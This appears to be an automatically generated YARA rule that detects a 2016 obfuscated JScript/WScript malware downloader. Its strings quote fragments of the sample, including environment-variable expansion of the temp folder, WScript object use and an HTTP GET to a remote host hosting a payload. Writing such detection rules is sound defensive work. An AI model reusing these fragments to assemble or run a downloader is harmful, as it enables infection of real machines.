rule sig_20160428_e6033075e3a967541ce931dbbe549d98 {
  meta:
    description = "datamaliciousorder - file 20160428_e6033075e3a967541ce931dbbe549d98.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "765f8f7bf6748ed8ac7dc976820ece95196797bbcecdc2203c0650795aee9855"

  strings:
    $s1  = "function YevPkmWcjHslSafYgqMud() {return GhpNonJlgGcnLgzYifXkn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function HobYirFdpQpkLqdMttGou(CewCegUcfVqgWmbYerOwo){GhpNonJlgGcnLgzYifXkn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function HobYirFdpQpkLqdMttGou(CewCegUcfVqgWmbYerOwo){GhpNonJlgGcnLgzYifXkn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var GhpNonJlgGcnLgzYifXkn = function RvbJmzUnjOuqEorDnaNlf() {return EnmXvsHhmBeqTrpMyuWew[FgpMuaKidTdeLowWxnMmw](\"WScript\"+\"" ascii
    $s5  = "function BqtGhjLpoXslQynApyWbn(CqtGwzQzhSriSeeAtsHjl, AdrHxqNjmFrmTkgBykJxr){DgxKhgAcdMjxIpdTpdTum = DgxKhgAcdMjxIpdTpdTum * 1; " ascii
    $s6  = "return CqtGwzQzhSriSeeAtsHjl - AdrHxqNjmFrmTkgBykJxr;};" fullword ascii
    $s7  = "UroVpfTgmFjlOknNyuGen[OmrRuxBpwCmoLwvZbyZlt](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "var GhpNonJlgGcnLgzYifXkn = function RvbJmzUnjOuqEorDnaNlf() {return EnmXvsHhmBeqTrpMyuWew[FgpMuaKidTdeLowWxnMmw](\"WScript\"+\"" ascii
    $s9  = "var EnmXvsHhmBeqTrpMyuWew = this[\"WScript\"];" fullword ascii
    $s10 = "function YevPkmWcjHslSafYgqMud() {return GhpNonJlgGcnLgzYifXkn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function BqtGhjLpoXslQynApyWbn(CqtGwzQzhSriSeeAtsHjl, AdrHxqNjmFrmTkgBykJxr){DgxKhgAcdMjxIpdTpdTum = DgxKhgAcdMjxIpdTpdTum * 1; " ascii
    $s12 = "function XyxHiiElqHwsSfjEnhRag(){return DwwOceBfaJpaItmJceSeu + \"\";};" fullword ascii
    $s13 = "if (UroVpfTgmFjlOknNyuGen[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function ZbsTdjAjeCmyYflDbwZef() {return ((IlnNybQvxYmeMjjIzqYha == true) && (IlnNybQvxYmeMjjIzqYha == JrhXmjNvbBunPsjCdtLlj)) ?" ascii
    $s15 = "function ZbsTdjAjeCmyYflDbwZef() {return ((IlnNybQvxYmeMjjIzqYha == true) && (IlnNybQvxYmeMjjIzqYha == JrhXmjNvbBunPsjCdtLlj)) ?" ascii
    $s16 = "var IlnNybQvxYmeMjjIzqYha = false;" fullword ascii
    $s17 = "function RblIhyEpsMwkCqrVwnMwv()" fullword ascii
    $s18 = "function PwcPtfFfyWlpDemMnmVea(XmbHjqVslEjrIenWnaQjw) {var DytHvcWavYvwVoeMbsLvf = (1, 2, 3, 4, 5, XmbHjqVslEjrIenWnaQjw); retur" ascii
    $s19 = "function PwcPtfFfyWlpDemMnmVea(XmbHjqVslEjrIenWnaQjw) {var DytHvcWavYvwVoeMbsLvf = (1, 2, 3, 4, 5, XmbHjqVslEjrIenWnaQjw); retur" ascii
    $s20 = "var ClqKdkKntMwoEraSylHwa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}